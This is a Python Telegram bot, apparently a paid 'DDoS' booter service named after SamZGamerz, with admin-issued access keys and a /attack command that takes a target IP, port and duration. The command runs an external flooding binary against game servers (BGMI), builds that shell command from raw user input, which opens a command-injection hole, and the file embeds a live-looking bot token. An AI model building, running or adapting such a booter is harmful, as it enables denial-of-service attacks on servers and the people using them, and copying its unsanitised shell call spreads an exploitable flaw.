import os
import telebot
import json
import logging
import time
from datetime import datetime, timedelta
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.new_event_loop()

TOKEN = "7031434586:AAGVY407Cpb80b-n0-EI1Abndzmw9nSUdpE"
FORWARD_CHANNEL_ID = -1002232097214
CHANNEL_ID = -1002232097214
error_channel_id = -1002232097214

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

KEYS_FILE = "keys.txt"
USERS_FILE = "users.txt"


def load_keys():
    keys = {}
    try:
        with open(KEYS_FILE, 'r') as file:
            lines = file.readlines()
            for line in lines:
                line = line.strip()
                if " - " in line:
                    key, expiration_date_str = line.split(" - ")
                    keys[key] = expiration_date_str
    except FileNotFoundError:
        logging.error(f"{KEYS_FILE} not found. Creating a new one.")
        with open(KEYS_FILE, 'w') as file:
            file.write("")
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
    return keys


def save_keys(keys):
    try:
        with open(KEYS_FILE, 'w') as file:
            for key, expiration_date in keys.items():
                file.write(f"{key} - {expiration_date}\n")
    except Exception as e:
        logging.error(f"Error saving keys: {e}")


def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, 'r') as file:
        return json.load(file)


def save_users(users):
    with open(USERS_FILE, 'w') as file:
        json.dump(users, file)


def is_admin(user_id):
    admin_ids = [6171003108]
    return user_id in admin_ids


def generate_key(days):
    try:
        expiration_date = datetime.now() + timedelta(days=days)
        key = f"SOUL-{expiration_date.timestamp():.0f}"

        logging.info(f"Generated Key: {key} (Expires on: {expiration_date})")

        with open("keys.txt", "a") as f:
            f.write(f"{key} - {expiration_date}\n")

        return key

    except Exception as e:
        logging.error(f"Error generating key: {e}")
        return "Error generating key!"


def redeem_key(user_id, key):
    try:

        with open("keys.txt", "r") as f:
            keys = f.readlines()
        logging.info(f"Loaded keys: {keys}")

        for line in keys:
            stored_key, expiration_date_str = line.strip().split(" - ")
            expiration_date = datetime.strptime(expiration_date_str, "%Y-%m-%d %H:%M:%S.%f")

            if stored_key == key:
                if datetime.now() > expiration_date:
                    return "Key has expired!"
                
                try:
                    with open("users.txt", "r") as user_file:
                        users_content = user_file.read().strip()
                        logging.info(f"Users file content: {users_content}")
                        
                        if not users_content:
                            logging.info("Users file is empty, initializing as empty dictionary.")
                            users = {}
                        else:
                            try:
                                users = json.loads(users_content)
                                logging.info(f"Loaded users: {users}")
                            except json.JSONDecodeError as e:
                                logging.error(f"JSON decoding error in users.txt: {e}")
                                users = {}
                except FileNotFoundError:
                    logging.warning("users.txt not found. Initializing as empty dictionary.")
                    users = {}

                for user_data in users.values():
                    if user_data.get('redeemed_key') == key:
                        return "This key has already been redeemed. Buy a new key from @SamZGamerz."

                if not has_access(user_id):
                    users[str(user_id)] = {'redeemed_key': key, 'has_access': True}
                    save_users(users)

                    bot.send_message(user_id, "Buy a New code From @SamZGamerz")

                return "Key redeemed successfully! You can now use the /attack command."

        return "Invalid key!"
    except Exception as e:
        logging.error(f"Error redeeming key: {e}", exc_info=True)
        return "Error redeeming key!"


def has_access(user_id):
    try:
        with open("users.txt", "r") as file:
            users_content = file.read().strip()
            if not users_content:
                logging.info("users.txt is empty, returning empty dictionary.")
                return False
            users = json.loads(users_content)
            user_data = users.get(str(user_id))
            if user_data:
                return user_data.get('has_access', False)
            return False
    except FileNotFoundError:
        logging.warning("users.txt not found. Returning False.")
        return False
    except json.JSONDecodeError as e:
        logging.error(f"Error decoding JSON from users.txt: {e}")
        return False


def delete_key_from_users(key):
    users = load_users()
    for user_id, data in users.items():
        if data.get('redeemed_key') == key:

            del users[user_id]
            save_users(users)
            logging.info(f"User {user_id} removed for key {key}.")
            break


@bot.message_handler(commands=['g_key'])
def handle_generate_key(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    logging.info(f"Received message: {message.text}")

    command_parts = message.text.split()
    logging.info(f"Command parts: {command_parts}")

    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /g_key <days>")
        return

    try:
        days = int(command_parts[1])
        
        if days <= 0:
            bot.reply_to(message, "Please enter a valid number of days (greater than 0).")
            return

        key = generate_key(days)
        bot.reply_to(message, f"Generated Key (valid for {days} days): {key}")

    except ValueError:
        bot.reply_to(message, "Usage: /g_key <days>")


@bot.message_handler(commands=['reedom'])
def handle_redeem_key(message):
    try:
        _, key = message.text.split()
        response = redeem_key(message.from_user.id, key)
        bot.reply_to(message, response)
    except ValueError:
        bot.reply_to(message, "Usage: /reedom <key>")


@bot.message_handler(commands=['delete_key'])
def handle_delete_key(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    logging.info(f"Received message for delete_key: {message.text}")

    command_parts = message.text.split()

    logging.info(f"Command parts: {command_parts}")

    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /delete_key <key>")
        return

    _, key = command_parts
    logging.info(f"Extracted key: {key}")

    keys = load_keys()

    if key not in keys:
        bot.reply_to(message, f"Invalid key! Key {key} not found.")
        return

    del keys[key]
    save_keys(keys)

    delete_key_from_users(key)

    bot.reply_to(message, f"Key {key} deleted successfully, and associated user data has been removed.")





@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        if not has_access(user_id):
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       "*You need to be approved to use this bot.*\n"
                                       "*Contact the owner for assistance: @SamZGamerz.*", parse_mode='Markdown')
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "⚠️ Please wait!*\n"
                                       "*The bot is busy with another attack.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                   "*Provide the target IP, port, and duration in seconds.*\n"
                                   "*Example: 167.67.25 6296 60* 🔥", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*", parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n"
                                           f"*Target Host: {target_ip}*\n"
                                           f"*Target Port: {target_port}*\n"
                                           f"*Duration: {duration} seconds!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

async def run_attack_command_async(target_ip, target_port, duration):
    attack_process = asyncio.create_subprocess_shell(
        f"./ipx {target_ip} {target_port} {duration}"
    )
    pkill_process = asyncio.create_subprocess_shell("pkill screen")

    await asyncio.gather(
        attack_process, pkill_process
    )
    bot.attack_in_progress = False

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')


@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Not set"
    first_name = message.from_user.first_name if message.from_user.first_name else "Not set"
    last_name = message.from_user.last_name if message.from_user.last_name else ""
    
    full_name = f"{first_name} {last_name}".strip()

    if has_access(user_id):
        status = "Approve"
    else:
        status = "NonApprove"

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_photo = profile_photos.photos[0][-1].file_id
    else:
        profile_photo = None
    
    welcome_message = f"""
    Welcome To SamZGamerz Ddos 
    Join @SamZGamerz
    
    Your Information Here:
    Name: {full_name}
    Username: @{username}
    ID Number: {user_id}
    Status: {status}
    /attack This will Attack On bgmi After use attack command add Ip Port Time
    /when To See Left Time
    /g_key To Create Key
    /reedom To Approve Him Self By key
    /delete_key To Remove User
    """
    
    if profile_photo:
        bot.send_photo(message.chat.id, profile_photo, caption=welcome_message)
    else:
        bot.reply_to(message, welcome_message)


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()


if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()

